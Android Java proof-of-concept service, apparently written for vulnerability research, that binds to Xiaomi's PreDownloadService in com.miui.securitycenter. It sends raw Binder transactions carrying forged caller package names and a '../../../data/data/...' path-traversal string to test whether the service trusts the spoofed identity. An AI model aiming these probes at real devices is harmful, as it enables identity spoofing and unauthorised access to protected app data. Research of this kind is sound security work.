package com.misrc.poc;

import android.app.Service;
import android.content.*;
import android.os.*;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.ArrayList;

/**
 * 针对性测试 PreDownloadService 的 code=1..3，尝试伪造包名。
 * 判定标准：服务端日志里 packageName 是否变成我们伪造的值。
 */
public class Fake extends Service {

    static final String TAG = "MISRC";
    static final String OUT = "/sdcard/misrc_fake.txt";
    static final String SVC = "com.xiaomi.game.predownload.service.PreDownloadService";
    static final String PKG = "com.miui.securitycenter";
    static final String DESC = "com.xiaomi.ecosys.gameservice.ability.predownload.IPreDownload";

    static final ArrayList<String> buf = new ArrayList<String>();
    Context ctx;
    ServiceConnection conn;

    static void w(String s) {
        Log.i(TAG, s);
        synchronized (buf) { buf.add(s); }
    }

    static void flush() {
        try {
            FileOutputStream fo = new FileOutputStream(new File(OUT));
            OutputStreamWriter ow = new OutputStreamWriter(fo, "UTF-8");
            synchronized (buf) { for (String s : buf) ow.write(s + "\n"); }
            ow.flush(); ow.close(); fo.close();
        } catch (Throwable t) { Log.e(TAG, "flush: " + t); }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        ctx = this;
        synchronized (buf) { buf.clear(); }
        w("=== 伪造包名测试 ===");
        w("自身 uid=" + android.os.Process.myUid());
        w("");

        conn = new ServiceConnection() {
            public void onServiceConnected(ComponentName n, IBinder b) {
                w("已连接, 描述符=" + safeDesc(b));
                runAll(b);
                flush();
                w("=== 完成，结果已写入 " + OUT + " ===");
                flush();
                try { unbindService(this); } catch (Throwable t) {}
                stopSelf();
            }
            public void onServiceDisconnected(ComponentName n) {}
        };

        Intent i = new Intent();
        i.setClassName(PKG, SVC);
        boolean ok = ctx.bindService(i, conn, Context.BIND_AUTO_CREATE);
        w("bindService=" + ok);
        if (!ok) { flush(); stopSelf(); }
        return START_NOT_STICKY;
    }

    static String safeDesc(IBinder b) {
        try { return b.getInterfaceDescriptor(); } catch (Throwable t) { return "?"; }
    }

    void runAll(IBinder b) {
        // 对每个 code，尝试多种参数形态，观察服务端日志变化
        String[] payloads = {
            "com.misrc.poc",                 // 自己
            "com.android.settings",          // 普通系统应用
            "com.miui.securitycenter",       // 宿主自己
            "../../../data/data/com.miui.securitycenter", // 路径穿越
        };

        for (int code = 1; code <= 3; code++) {
            for (int pi = 0; pi < payloads.length; pi++) {
                String p = payloads[pi];
                w("--- code=" + code + " payload=" + p);
                Parcel d = Parcel.obtain(), r = Parcel.obtain();
                try {
                    d.writeInterfaceToken(DESC);
                    d.writeString(p);
                    d.writeInt(0);
                    boolean t = b.transact(code, d, r, 0);
                    r.setDataPosition(0);
                    int avail = r.dataAvail();
                    String res = "";
                    if (avail >= 4) {
                        int f = r.readInt();
                        if (f != 0) {
                            try { res = "异常:" + r.readString(); } catch (Throwable x) {}
                        } else {
                            res = "OK avail=" + avail;
                            try { if (r.dataAvail() > 0) res += " str=" + r.readString(); } catch (Throwable x) {}
                        }
                    } else res = "空响应";
                    w("    transact=" + t + " " + res);
                } catch (Throwable x) {
                    w("    异常 " + x.getClass().getSimpleName() + ": " + x.getMessage());
                } finally { d.recycle(); r.recycle(); }
                try { Thread.sleep(120); } catch (Throwable x) {}
            }
        }
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
